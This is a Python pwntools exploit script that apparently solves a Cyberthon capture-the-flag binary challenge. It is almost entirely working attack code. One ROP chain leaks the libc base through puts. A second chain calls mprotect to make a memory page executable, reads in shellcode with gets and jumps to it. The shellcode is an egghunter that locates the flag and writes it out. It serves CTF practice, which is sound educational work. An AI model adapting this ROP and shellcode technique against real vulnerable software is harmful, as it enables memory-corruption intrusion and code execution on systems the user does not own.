from pwn import *

elf = context.binary = ELF("chall")
libc = elf.libc
if args.REMOTE:
	p = remote("chals.f.cyberthon25.ctf.sg", 30101)
else:
	p = elf.process()

sla = lambda a, b: p.sendlineafter(a, b)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
s = lambda a: p.send(a)
rl = lambda: p.recvline()
ru = lambda a: p.recvuntil(a)

# prepare payload to leak libc base
r = ROP(elf)
r.puts(elf.got.puts)
r.main()
r.raw(b"B"*8)
log.info(r.dump())
payload = p64(r.ret[0])*((256-len(r.chain()))//8) + r.chain()
assert len(payload)==256

# run rop chain 1 to leak libc base and loop back to main
sla(b")\n", b"book")
sla(b")\n", b"circle")
sla(b"?\n", payload)
sla(b"?\n", payload)
sla(b"?\n", b"7")

# receive the output of rop chain 1
p.recvuntil(b"hunt!\n\x1b[0m")
libc.address = unpack(p.recv(6), "all") - libc.sym.puts
log.success(f"libc base @ {hex(libc.address)}")

r = ROP(libc)
r.mprotect(0x602000, 0x1000, 7)
r.gets(0x602500)
r.call(0x602500)
log.info(r.dump())
payload = p64(r.ret[0])*((256-len(r.chain()))//8) + r.chain()
assert len(payload)==256

# run rop chain 2
sla(b")\n", b"book")
sla(b")\n", b"circle")
sla(b"?\n", payload)
sla(b"?\n", payload)
sla(b"?\n", b"7")

sleep(0.5)
log.info(f"starting egghunt!")
p.sendline(asm(shellcraft.egghunter(b"Cybe", 0x1000)) + asm(shellcraft.write(1, 'rbx', 0x100)) + asm(shellcraft.exit(0)))

p.interactive()
